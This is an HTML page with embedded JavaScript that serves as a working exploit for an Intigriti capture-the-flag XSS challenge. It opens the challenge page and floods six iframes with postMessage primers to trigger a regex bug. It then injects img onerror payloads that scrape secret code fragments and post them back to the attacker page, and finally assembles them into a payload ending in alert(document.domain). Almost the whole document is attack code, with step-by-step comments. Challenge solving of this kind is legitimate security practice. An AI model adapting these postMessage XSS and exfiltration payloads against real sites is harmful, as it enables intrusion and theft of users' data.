<!DOCTYPE html>
<html>
<head>
    <title>Intigriti Exploit</title>
</head>
<body>
    <h1>Challenge Solver</h1>
    <p>Click the button to start the exploit chain.</p>
    <button id="btn" style="font-size:20px; padding:15px;">Launch Exploit</button>
    <div id="log"></div>

    <script>
        let stolenStones = {};
        let targetWin = null;

        // 1. Listen for the stolen pieces coming back from the Stones
        window.addEventListener('message', (event) => {
            if (event.data.type === 'stone_collected') {
                log(`Collected Stone ${event.data.index}: ${event.data.secret}`);
                stolenStones[event.data.index] = event.data.secret;
                checkAndSnap();
            }
        });

        document.getElementById('btn').addEventListener('click', () => {
            // 2. Open the target (This bypasses "No Popups" because it's a click)
            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
            log("Target opened... waiting for load...");

            // 3. Wait for the target to load, then attack the Stones
            setTimeout(attackAllStones, 4000);
        });

        function attackAllStones() {
            log("Attacking Stones...");
            // There are 6 stones (frames 0 to 5). We exploit all of them.
            for (let i = 0; i < 6; i++) {
                sendExploit(i);
            }
        }

        function sendExploit(index) {
            // TARGET THE IFRAME, NOT THE MAIN WINDOW
            // We can access targetWin.frames[i] to postMessage to the sub-iframe
            let targetFrame = targetWin.frames[index];

            // STEP 1: The Primer (Trigger the Regex Bug)
            // Sends 100 safe chars + 1 bad char (<)
            const padding = "A".repeat(100);
            targetFrame.postMessage(padding + "<", '*');

            // STEP 2: The Payload (XSS)
            // This JS executes INSIDE the Stone subdomain.
            // It grabs the secret code part and sends it back to OUR exploit page (opener).
            
            // Note: Space Stone (Index 3) gets data differently, but let's try URL first for all.
            // Most stones have code in ?stone_name=CODE
            const extractorScript = `
                var codePart = "";
                // Try URL first
                var match = location.search.match(/=[a-f0-9]{8}/);
                if(match) codePart = match[0].substring(1);
                
                // Special case for Space Stone (if needed), might need body scrape
                if(!codePart) codePart = document.body.innerText.substring(0,8); // Fallback guess

                // Send back to attacker
                window.opener.postMessage({type: 'stone_collected', index: ${index}, secret: codePart}, '*');
            `;

            const payload = `<img src=x onerror="${extractorScript}">`;
            
            // Send payload immediately after primer
            targetFrame.postMessage(payload, '*');
        }

        function checkAndSnap() {
            // Do we have all 6 pieces?
            // The stones are loaded in this DOM order: 
            // 0:Power, 1:Reality, 2:Soul, 3:Space, 4:Time, 5:Mind
            // But the Code structure is: Power(0-8) + Mind(8-16) + Reality(16-24) + Space(24-32) + Soul(32-40) + Time(40-48)
            
            // Check if we have the specific indices we need
            if (stolenStones[0] && stolenStones[5] && stolenStones[1] && stolenStones[3] && stolenStones[2] && stolenStones[4]) {
                
                const p1 = stolenStones[0]; // Power
                const p2 = stolenStones[5]; // Mind
                const p3 = stolenStones[1]; // Reality
                const p4 = stolenStones[3]; // Space
                const p5 = stolenStones[2]; // Soul
                const p6 = stolenStones[4]; // Time

                const fullCode = p1 + p2 + p3 + p4 + p5 + p6;
                log("FULL CODE ASSEMBLED: " + fullCode);

                // FINAL ATTACK: Use the code to trigger the alert on the Main Domain
                // We use the Soul Stone (Index 2) to deliver the message to 'parent'
                const killPayload = `<img src=x onerror="parent.postMessage('${fullCode}' + 'alert(document.domain)', '*')">`;
                
                // Re-trigger regex on Stone 2
                targetWin.frames[2].postMessage("A".repeat(100) + "<", '*');
                targetWin.frames[2].postMessage(killPayload, '*');
                
                log("Final payload sent!");
            }
        }

        function log(msg) {
            document.getElementById('log').innerText += msg + "\n";
            console.log(msg);
        }
    </script>
</body>
</html>
